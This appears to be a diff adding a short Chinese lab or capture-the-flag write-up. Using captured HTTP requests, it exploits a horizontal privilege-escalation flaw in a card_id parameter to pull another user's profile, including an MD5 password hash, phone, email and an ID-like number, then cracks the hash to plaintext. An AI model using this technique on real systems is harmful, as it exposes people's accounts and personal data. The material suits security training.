@@ -1,0 +1,49 @@
+马春生图片链接
+
+http://124.70.64.48:47325/static/img/20128880316.jpg
+
+登录test账户，抓包
+GET /user_info.php HTTP/1.1
+Host: 124.70.64.48:47325
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://124.70.64.48:47325/index.php?a=login
+Connection: close
+Cookie: PHPSESSID=2a14ujvvjk9puum9qvpelkaae2; uid=test; mid=6927071f788211ee17211be0b89ef1e6
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+
+
+GET /json.php?card_id=20128880322 HTTP/1.1
+Host: 124.70.64.48:47325
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://124.70.64.48:47325/user_info.php
+Cookie: PHPSESSID=2a14ujvvjk9puum9qvpelkaae2; uid=test; mid=6927071f788211ee17211be0b89ef1e6
+Cache-Control: max-age=0
+
+
+card_id 存在水平越权漏洞
+
+获取到
+card_id=20128880316的数据
+
+getProfile({"card_id":"20128880316",
+"user":"m233241",
+"password":"71cc568f1ed55738788751222fb6d8d9",
+"email":"hhh222@gmail.com","tel":"13922137899",
+"login_ip":"110.21.43.66",
+"name_uid":"520181197603155771"})  
+
+密码形式：观察应该是md5加密
+
+md5查询：
+71cc568f1ed55738788751222fb6d8d9
+9732343
+
